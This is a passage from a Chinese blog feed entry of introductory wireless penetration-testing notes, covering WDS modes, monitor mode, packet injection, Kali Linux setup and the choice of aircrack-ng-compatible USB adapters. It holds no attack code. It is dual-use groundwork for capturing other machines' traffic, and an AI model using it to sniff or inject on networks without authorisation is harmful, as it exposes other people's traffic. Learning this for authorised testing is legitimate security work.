</code></pre></li><li>WIRELESS DISTRIBUTION SYSTEM(WDS)<ul><li>与有限DS类似,只是通过无线连接的多个AP组成的网络<ul><li>Bindging(桥接方式)-只有AP间彼此通信</li><li>Repeating(中继方式)-只允许所有AP和STA进行通信</li></ul></li></ul></li><li>c.MONITOR MODE(类似于有线网络的混杂模式,可抓住其他机器的流量)<ul><li>Monitor 不是一种真的无线模式<ul><li>但是对无线渗透至关重要</li><li>允许无线网卡没有任何筛选的抓包(802.11包头)</li><li>与有线网络的混杂模式可以类比</li><li>审核的网卡和驱动不但可以monitor,更可以Injection</li></ul>6.无线网络硬件设备及基本概念<ul><li>物理机运行kali</li><li>虚拟机运行kali</li><li>外置USB 无线网卡</li><li>TL-WN722N(个人建议)</li><li>dmseg</li><li>iwconfig</li></ul>7.选择无线网卡</li></ul></li><li>这是个痛苦和受挫的过程</li><li>无线网卡的芯片和型号是成败的关键</li><li>台式机:<ul><li>USB 无线卡 (不支持扩展天线)</li><li>PCMCIA(16 bit 已停产)</li><li>Cardbus(32 bit PCMCIA 8.0标准)</li><li>Express Cards</li><li>MiniPCI</li><li>MiniPCI Express</li></ul></li><li>发送功率:远程连接</li><li>接收灵敏:适当降低灵敏度,接收效果更佳</li><li>经验但不是铁律<ul><li>或 Realtek 芯片</li><li>没有神器</li><li>兼容 aircrack-ng suite</li><li><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters</a></li></ul></li><li>无线渗透网卡没有所谓标准,但是Aircrack-ng suite 作者给出建议</li><li>Alfa Networks AWUS036H 无线网卡<br>8.无线技术概念</li></ul></blockquote><blockquote><p>9.Linux无线协议栈及配置命令</p></blockquote><blockquote><p>10.RADIOTAP头</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="信息安全" scheme="https://Wheeeeeeeeels.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="渗透测试" scheme="https://Wheeeeeeeeels.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Kali Linux大法" scheme="https://Wheeeeeeeeels.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kali-Linux%E5%A4%A7%E6%B3%95/"/>
    
    
      <category term="渗透测试" scheme="https://Wheeeeeeeeels.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息安全" scheme="https://Wheeeeeeeeels.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
